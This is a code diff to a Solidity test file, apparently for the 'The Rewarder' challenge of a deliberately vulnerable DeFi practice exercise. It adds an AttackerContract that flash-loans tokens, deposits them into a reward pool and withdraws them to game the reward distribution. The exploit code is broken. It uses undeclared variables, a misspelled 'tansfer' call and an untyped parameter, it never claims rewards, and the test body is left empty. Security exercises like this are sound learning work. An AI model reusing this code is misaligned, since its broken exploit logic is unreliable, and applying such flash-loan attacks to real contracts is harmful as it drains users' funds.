@@ -12,6 +12,30 @@ import {RewardToken} from "../../../Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract AttackerContract {
+    address public owner;
+    FlashLoanerPool public flashLoanerPool;
+    uint256 TOTAL_AMOUNT_TO_FLASHLOAN = dvt.balanceOf(theRewarderPool) * 2;
+
+    constructor(address pool) {
+        owner = msg.sender;
+        flashLoanerPool = FlashLoanerPool(pool);
+    }
+
+    function attack() public {
+        require(msg.sender == owner, "Not Owner");
+        flashLoanerPool.flashLoan(TOTAL_AMOUNT_TO_FLASHLOAN);
+    }
+
+    function receiveFlashLoan(_totalAmountToFlashLoan, uint256) public {
+        require(msg.sender == flashLoanerPool, "Not Pool");
+        dvt.approve(theRewarderPool, TOTAL_AMOUNT_TO_FLASHLOAN);
+        theRewarderPool.deposit(TOTAL_AMOUNT_TO_FLASHLOAN);
+        theRewarderPool.withdraw(TOTAL_AMOUNT_TO_FLASHLOAN);
+        dvt.tansfer(flashLoanerPool, TOTAL_AMOUNT_TO_FLASHLOAN);
+    }
+}
+
 contract TheRewarder is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
 
@@ -91,9 +115,11 @@ contract TheRewarder is DSTest {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testRewarderExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
